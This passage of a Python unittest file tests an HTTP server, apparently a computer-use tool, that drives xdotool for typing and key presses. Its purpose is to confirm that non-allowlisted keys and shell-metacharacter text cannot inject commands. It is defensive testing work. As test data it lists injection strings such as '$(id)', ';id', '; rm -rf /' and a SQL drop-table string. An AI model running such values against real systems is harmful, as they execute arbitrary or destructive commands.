                self.assertEqual(status, 400, body)
                self.assertFalse(self.recorder.calls)

    def test_a_key_the_allowlist_does_not_know_never_reaches_xdotool(self):
        for key in (";id", "F13", "ENTER;id", "a b", "xdotool"):
            with self.subTest(key=key):
                self.recorder.calls.clear()
                status, body = self.post("/computer/key", {"key": key})
                self.assertEqual(status, 200)
                self.assertFalse(body["ok"], f"{key!r} was accepted")
                self.assertFalse(
                    self.recorder.calls, f"{key!r} reached xdotool over HTTP"
                )

    def test_shell_metacharacters_survive_as_one_argument(self):
        # The whole point: a request whose text looks like a command is still
        # just text, and it stays a single argv entry end to end over HTTP.
        for nasty in (
            "$(id)",
            "`id`",
            "; rm -rf /",
            "a && b | c",
            '"; DROP TABLE users; --',
            "\nnewline",
        ):
            with self.subTest(text=nasty):
                self.recorder.calls.clear()
                status, body = self.post("/computer/type", {"text": nasty})
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                argv = self.recorder.calls[-1]
                self.assertEqual(argv[-1], nasty, "the text was mangled")
                # "--" before the text means xdotool stops parsing options, so
                # even a leading dash cannot become a flag.
                self.assertIn("--", argv)
                self.assertEqual(argv.count(nasty), 1)

    def test_malformed_json_is_a_400_not_a_crash(self):
        status, body = self.post("/computer/type", b"{not json")
        self.assertEqual(status, 400)
        self.assertFalse(body["ok"])
        self.assertFalse(self.recorder.calls)

    def test_the_server_survives_a_bad_request(self):
        self.post("/computer/type", b"{not json")
        self.post("/computer/key", {"key": ";id"})
        # Still serving, and still acting correctly, after two bad requests.
        self.recorder.calls.clear()
        status, body = self.post("/computer/type", {"text": "still here"})
        self.assertEqual(status, 200, body)
        self.assertTrue(body["ok"], body)
        self.assertEqual(self.recorder.calls[-1][-1], "still here")


if __name__ == "__main__":
    unittest.main(verbosity=2)
